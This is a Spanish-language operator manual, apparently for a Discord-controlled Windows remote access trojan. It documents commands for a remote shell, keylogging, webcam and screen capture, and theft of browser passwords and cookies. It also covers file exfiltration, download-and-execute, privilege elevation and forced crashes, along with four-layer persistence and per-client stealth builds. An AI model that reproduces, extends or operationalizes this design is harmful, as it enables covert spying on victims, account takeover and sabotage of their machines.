# Comandos

Se ejecutan en el canal de sesión del equipo y responden ahí.

| Comando | Qué hace | Para qué |
|---|---|---|
| `/shell <cmd>` | Ejecuta en `cmd.exe` y devuelve la salida. | Todo lo que no tiene comando propio. |
| `/screenshot` | Captura el escritorio. | Ver qué hay en pantalla. |
| `/sysinfo` | Hostname, usuario, IP, Windows, privilegios. | Primera foto del equipo. |
| `/ps list` | Lista procesos con PID y memoria. | Ver qué corre encima. |
| `/ps kill <pid>` | Mata el proceso y sus hijos. | Quitar lo que estorba. |
| `/keylog start` | Reengancha el keylogger si lo detuviste. | Captura activa sin reiniciar. |
| `/keylog stop` | Lo detiene hasta el próximo arranque. | Cortar la captura en caliente. |
| `/keylog dump` | Publica el .txt agrupado por ventana, con proceso y hora UTC. | Leer qué se escribió y dónde. |
| `/keylog clear` | Vacía el buffer en memoria. | Empezar un registro limpio. |
| `/download <ruta>` | Sube un archivo o carpeta comprimida. | Sacar lo que interesa. |
| `/upload <url>` | Descarga y opcionalmente ejecuta. | Meter una herramienta. |
| `/clip get` | Lee el portapapeles. | Recuperar lo último copiado. |
| `/clip set <texto>` | Escribe el portapapeles. | Dejar algo listo para pegar. |
| `/msgbox <título> <texto> [icono]` | Abre un aviso en pantalla. | Hablar con quien está delante. |
| `/webcam` | Captura un frame de la cámara. | Ver quién está. |
| `/passwords` | Cookies y contraseñas de Chrome, Edge y Brave. | Entrar sin pasar por login. |
| `/lockscreen on [min]` | Cortina negra, teclado y ratón bloqueados. | Congelar la máquina. |
| `/lockscreen off` | Levanta la cortina. | Devolver el control. |
| `/lockscreen status` | Dice si está activa. | Comprobar el estado. |
| `/elevate` | Pide UAC y relanza como admin. | Todo lo que necesita administrador. |
| `/bsod [diagnostico]` | Fuerza un bugcheck. | Apagar sin cierre limpio. |
| `/kill` | Apaga el agente hasta el próximo arranque. | Silenciarlo un rato. |
| `/shutdown` | Apaga el agente y borra la persistencia. | Retirada limpia. |

El panel publica quince botones con las mismas acciones.

## El dump del keylogger

Sale como `keylog_<host>_<AAAAMMDD_HHMMSS>.txt`, UTF-8, un bloque por ventana con foco:

```
[2026-11-23 14:32:01 UTC] chrome.exe — "Gmail - Inbox"
hola como estas[ENTER]
esto es un mensaje[CTRL+C]

[2026-11-23 14:33:45 UTC] chrome.exe — "general - Discord"
oye te mando el archivo[ENTER]
```

- Las teclas sin texto van marcadas inline: `[ENTER]`, `[TAB]`, `[BKSP]`, `[DEL]`, `[ESC]`, `[WIN]`, `[LEFT]`, `[UP]`, `[RIGHT]`, `[DOWN]`, `[HOME]`, `[END]`, `[PGUP]`, `[PGDN]`, `[INS]`, `[PRTSC]`, `[MENU]`, `[PAUSE]`, `[NUMLOCK]`, `[SCROLL]`, `[F1]`…`[F12]`.
- Con CTRL pulsado: `[CTRL+C]`, `[CTRL+V]`, `[CTRL+X]`, `[CTRL+A]`, `[CTRL+Z]`, `[CTRL+S]` y `[CTRL+Flecha]`, `[CTRL+F5]`.
- Una tecla mantenida no repite el bloque: el auto-repeat se funde en `[RIGHT]x16`.
- Lo que no produce rune ni tiene etiqueta sale como `[VK:0xNN]`.
- Las sesiones sin teclas no aparecen. Cada ventana cerrada queda además en `keylog.txt` del directorio de estado, con tope de 8 MB y rotación a `.1`.

## El agente

- **Una instancia por equipo**, garantizada con mutex. Las copias sobrantes salen solas.
- **Un canal `sesion-N`** por equipo en la guild. Ahí vive el panel y ahí se responde.
- **Cuatro capas de persistencia**: RunKey, tarea de logon, tarea de arranque como SYSTEM y servicio. Un watchdog revisa cada minuto y relanza si falta.
- **Reconexión** con espera creciente, más watchdog de red para la sesión zombi.
- **Identidad propia** por cliente: nombre, servicio, tareas, registro y carpeta salen de `internal/config` y se fijan al compilar con `-ldflags -X`.
- **Sin puertos abiertos**: todo sale hacia el gateway y el webhook.
- **Una aplicación de Discord por cliente**: dos agentes con el mismo token se expulsan.
